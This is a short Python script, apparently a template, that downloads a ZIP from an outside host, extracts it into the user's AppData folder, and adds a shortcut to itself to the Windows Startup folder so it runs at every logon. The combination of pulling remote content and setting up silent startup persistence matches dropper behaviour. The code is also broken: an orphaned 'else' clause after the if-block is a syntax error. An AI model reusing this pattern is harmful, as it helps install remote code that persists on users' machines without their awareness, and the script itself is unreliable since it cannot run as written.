import requests
import zipfile
import os
import shutil
import winshell


def fetch_and_unzip_to_secure_location():
    # Fetch the ZIP from the API
    url = "http://api.extraction.querco.co/dist.zip"
    response = requests.get(url)

    # Ensure the request was successful
    if response.status_code == 200:
        # Save the ZIP to a temporary file
        with open("temp.zip", "wb") as f:
            f.write(response.content)

    # Extract the ZIP
    with zipfile.ZipFile("temp.zip", 'r') as zip_ref:
        zip_ref.extractall("temp_folder")

    # Determine the main directory inside the ZIP (ignoring __MACOSX and other unwanted dirs)
    contents = [item for item in os.listdir(
        "temp_folder") if item != "__MACOSX"]
    if len(contents) == 1:
        main_directory = os.path.join("temp_folder", contents[0])
    else:
        main_directory = "temp_folder"

    # Secure location: User's AppData Folder
    target_directory = os.path.expanduser('~\\AppData\\Local\\YourAppName')
    if not os.path.exists(target_directory):
        os.makedirs(target_directory)

    # Move the contents to the desired folder
    for item in os.listdir(main_directory):
        source = os.path.join(main_directory, item)
        destination = os.path.join(target_directory, item)
        if os.path.exists(destination):
            if os.path.isdir(destination):
                shutil.rmtree(destination)
            else:
                os.remove(destination)
        shutil.move(source, destination)

    # Cleanup: remove temporary ZIP and folder
    os.remove("temp.zip")
    shutil.rmtree("temp_folder")

    else:
        print(f"Failed to fetch ZIP. Status code: {response.status_code}")


def add_to_startup():
    startup_folder = os.path.expanduser(
        '~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    exe_path = os.path.abspath(__file__)
    shortcut_path = os.path.join(startup_folder, "your_script_name.lnk")

    # Check if already added to startup
    if not os.path.exists(shortcut_path):
        winshell.CreateShortcut(
            Path=shortcut_path,
            Target=exe_path,
            Icon=(exe_path, 0),
            Description="Your Script Description"
        )


if __name__ == "__main__":
    fetch_and_unzip_to_secure_location()
    add_to_startup()
